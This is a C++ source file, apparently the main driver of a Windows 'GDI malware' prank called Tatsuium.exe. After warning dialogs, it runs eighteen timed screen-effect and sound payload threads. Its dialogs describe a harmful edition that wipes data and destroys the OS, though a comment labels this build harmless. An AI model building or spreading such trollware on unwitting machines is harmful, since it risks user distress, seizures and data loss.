// Tatsuium.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。
//

#include <windows.h>
#include <windowsx.h>
#include <cmath>
#include <stdio.h>
#include <tchar.h>
#include <ShlObj.h>
#include "Bytebeats.h"
#include "Payloads.h"

void Init_DPI() {
    HMODULE user32 = GetModuleHandleA("user32.dll");
    if (user32) {
        typedef DWORD(CALLBACK* dpi)(DWORD);
        dpi d_p_i = (dpi)GetProcAddress(user32, "SetProcessDPIAware");
        if (d_p_i) { d_p_i(0); }
    }
}

void dwm_turnoff() { //Only works in Windows Vista and Windows 7.
    HMODULE dwmapi = GetModuleHandleA("dwmapi.dll");
    if (dwmapi) {
        typedef DWORD(CALLBACK* dwm)(DWORD);
        dwm d_w_m = (dwm)GetProcAddress(dwmapi, "DwmEnableComposition");
        if (d_w_m) { d_w_m(0); }
    }
}

void StopThread(HANDLE thread) {
    if (thread == NULL) { return; }
    TerminateThread(thread, 0);
    CloseHandle(thread);
    return;
}

HANDLE MyIcons1T, MyIcons2T, DrawIconsAndCursorsT, DrawTextsT, ciciciT;
void RunPayload() {
    Init_DPI();
    dwm_turnoff();

    sound1();
    HANDLE Payload1T = CreateThread(0, 0, Payload1, 0, 0, 0);
    Sleep(30000);
    StopThread(Payload1T);
    RefreshScreen();
    Sleep(100);

    sound2();
    HANDLE Payload2T = CreateThread(0, 0, Payload2, 0, 0, 0);
    DrawIconsAndCursorsT = CreateThread(0, 0, DrawIconsAndCursors, 0, 0, 0);
    ciciciT = CreateThread(0, 0, cicici, 0, 0, 0);
    Sleep(30000);
    StopThread(Payload2T);
    StopThread(ciciciT);
    RefreshScreen();
    Sleep(100);

    sound3();
    HANDLE Payload3T = CreateThread(0, 0, Payload3, 0, 0, 0);
    Sleep(30000);
    StopThread(Payload3T);
    RefreshScreen();
    Sleep(100);

    sound4();
    HANDLE Payload4T = CreateThread(0, 0, Payload4, 0, 0, 0);
    Sleep(30000);
    StopThread(Payload4T);
    RefreshScreen();
    Sleep(100);

    sound5();
    HANDLE Payload5T = CreateThread(0, 0, Payload5, 0, 0, 0);
    Sleep(30000);
    StopThread(Payload5T);
    RefreshScreen();
    Sleep(100);

    sound6();
    HANDLE Payload6T = CreateThread(0, 0, Payload6, 0, 0, 0);
    Sleep(30000);
    StopThread(Payload6T);
    RefreshScreen();
    Sleep(100);

    sound7();
    HANDLE Payload7T = CreateThread(0, 0, Payload7, 0, 0, 0);
    MyIcons1T = CreateThread(0, 0, MyIcons1, 0, 0, 0);
    Sleep(30000);
    StopThread(Payload7T);
    RefreshScreen();
    Sleep(100);

    sound8();
    HANDLE Payload8T = CreateThread(0, 0, Payload8, 0, 0, 0);
    Sleep(30000);
    StopThread(Payload8T);
    RefreshScreen();
    Sleep(100);

    sound9();
    HANDLE Payload9T = CreateThread(0, 0, Payload9, 0, 0, 0);
    Sleep(30000);
    StopThread(Payload9T);
    RefreshScreen();
    Sleep(100);

    sound10();
    HANDLE Payload10T = CreateThread(0, 0, Payload10, 0, 0, 0);
    ciciciT = CreateThread(0, 0, cicici, 0, 0, 0);
    Sleep(30000);
    StopThread(Payload10T);
    RefreshScreen();
    Sleep(100);

    sound11();
    HANDLE Payload11T = CreateThread(0, 0, Payload11, 0, 0, 0);
    Sleep(30000);
    StopThread(Payload11T); StopThread(ciciciT);
    RefreshScreen();
    Sleep(100);

    sound12();
    HANDLE Payload12T = CreateThread(0, 0, Payload12, 0, 0, 0);
    Sleep(30000);
    StopThread(Payload12T);
    RefreshScreen();
    Sleep(100);

    sound13();
    HANDLE Payload13T = CreateThread(0, 0, Payload13, 0, 0, 0);
    Sleep(30000);
    StopThread(Payload13T);
    RefreshScreen();
    Sleep(100);

    sound14();
    HANDLE Payload14T = CreateThread(0, 0, Payload14, 0, 0, 0);
    Sleep(30000);
    StopThread(Payload14T);
    RefreshScreen();
    Sleep(100);

    sound15();
    HANDLE Payload15T = CreateThread(0, 0, Payload15, 0, 0, 0);
    DrawTextsT = CreateThread(0, 0, DrawTexts, 0, 0, 0);
    MyIcons2T = CreateThread(0, 0, MyIcons2, 0, 0, 0);
    Sleep(30000);
    StopThread(Payload15T);
    RefreshScreen();
    Sleep(100);

    sound16();
    HANDLE Payload16T = CreateThread(0, 0, Payload16, 0, 0, 0);
    Sleep(30000);
    StopThread(Payload16T);
    RefreshScreen();
    Sleep(100);

    sound17();
    HANDLE Payload17T = CreateThread(0, 0, Payload17, 0, 0, 0);
    Sleep(30000);
    StopThread(Payload17T);
    StopThread(DrawIconsAndCursorsT); StopThread(DrawTextsT); StopThread(MyIcons1T); StopThread(MyIcons2T);
    RefreshScreen();
    Sleep(100);

    sound18();
    HANDLE Payload18T = CreateThread(0, 0, Payload18, 0, 0, 0);
    Sleep(30000);
    StopThread(Payload18T);
    RefreshScreen();
    Sleep(100);
}

bool IsWindowsXP() { //By VenraTech (Windows XP Checker)
    OSVERSIONINFOA osvi;
    ZeroMemory(&osvi, sizeof(OSVERSIONINFOA));
    osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOA);
    GetVersionExA(&osvi);
    if (osvi.dwMajorVersion == 5) { return true; }
    return false;
}

int CALLBACK WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    //I'm lazy to edit the warning messages for harmless edition :/
    LPCSTR XPCompatibleTitle = "Compatibility Warning - Tatsuium.exe";
    LPCSTR XPCompatibleText = "You're running this malware in Windows XP, It may crash or not working properly when the malware is running.\r\nIt is recommend to run this malware in Windows Vista or higher version.\r\n\r\nClick \"Yes\" to ignore this compatibility warning and continue.\r\nOtherwise, Click \"No\" to exit.";
    LPCSTR FirstWarningTitle = "\"There's two path, One is live, Another one is die, Which path will you choose?\"";
    LPCSTR LastWarningTitle = "This is your last change, Choose carefully.";
    LPCSTR FirstWarningText = "You have just executed the harmful edition of Tatsuium.exe. This malware was created ONLY for educational and enterainment purposes.\r\nIt will show some GDI effects, play some loud noises, delete all your data and destroy your operating system.\r\n\r\nIf you don't know what have you executed, Just click \"No\" and delete this file immediately!\r\nOtherwise, If you know what will this malware do, and you're running this malware in a safe environment, You may click \"Yes\" to run this malware.\r\n\r\n(This malware contains flashing lights, If you have photosensitive epilepsy, Please don't run this malware.)";
    LPCSTR LastWarningText = "This is your LAST change to stop running this malware, You better know what are you doing.\r\n\r\nClicking \"Yes\" will start the destruction, You will lose all your data, and your operating system will be destroyed.\r\nThe creator is NOT responsible for any damages by using this malware.\r\n\r\nProceed to run?";

    if (MessageBoxA(NULL, FirstWarningText, FirstWarningTitle, MB_YESNO | MB_ICONEXCLAMATION) == IDYES) {
        if (IsWindowsXP() == true) {
            if (MessageBoxA(NULL, XPCompatibleText, XPCompatibleTitle, MB_YESNO | MB_ICONQUESTION) == IDNO) { ExitProcess(0); }
        }
        if (MessageBoxA(NULL, LastWarningText, LastWarningTitle, MB_YESNO | MB_ICONEXCLAMATION) == IDYES) {
            Sleep(5000);
            RunPayload();
            ExitProcess(0);
        }
        else {
            ExitProcess(0);
        }
    }
    else {
        ExitProcess(0);
    }
}